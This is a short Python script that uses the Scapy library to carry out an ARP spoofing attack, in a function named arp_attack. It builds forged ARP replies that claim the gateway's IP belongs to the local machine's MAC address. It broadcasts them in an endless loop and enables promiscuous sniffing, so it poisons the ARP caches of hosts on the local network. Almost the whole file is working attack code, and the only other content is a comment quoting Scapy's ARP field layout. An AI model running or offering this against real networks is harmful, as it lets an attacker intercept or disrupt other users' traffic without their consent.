# coding=utf-8

from scapy.all import *
from scapy.all import ARP

from tools import *


def arp_attack():
    apr_spoof = ARP()

    psrc = get_gate_way()
    pdst = get_broadcast()
    hwsrc = get_mac_address()

    apr_spoof.psrc = psrc
    apr_spoof.pdst = pdst
    apr_spoof.hwsrc = hwsrc
    apr_spoof.op = 2

    while 1:
        send(apr_spoof)
        print 'arp sent'


conf.sniff_promisc = True

'''
[ XShortField("hwtype", 0x0001),
                    XShortEnumField("ptype",  0x0800, ETHER_TYPES),
                    ByteField("hwlen", 6),
                    ByteField("plen", 4),
                    ShortEnumField("op", 1, {"who-has":1, "is-at":2, "RARP-req":3, "RARP-rep":4, "Dyn-RARP-req":5, "Dyn-RAR-rep":6, "Dyn-RARP-err":7, "InARP-req":8, "InARP-rep":9}),
                    ARPSourceMACField("hwsrc"),
                    SourceIPField("psrc","pdst"),
                    MACField("hwdst", ETHER_ANY),
                    IPField("pdst", "0.0.0.0") ]
'''
if __name__ == '__main__':
    arp_attack()
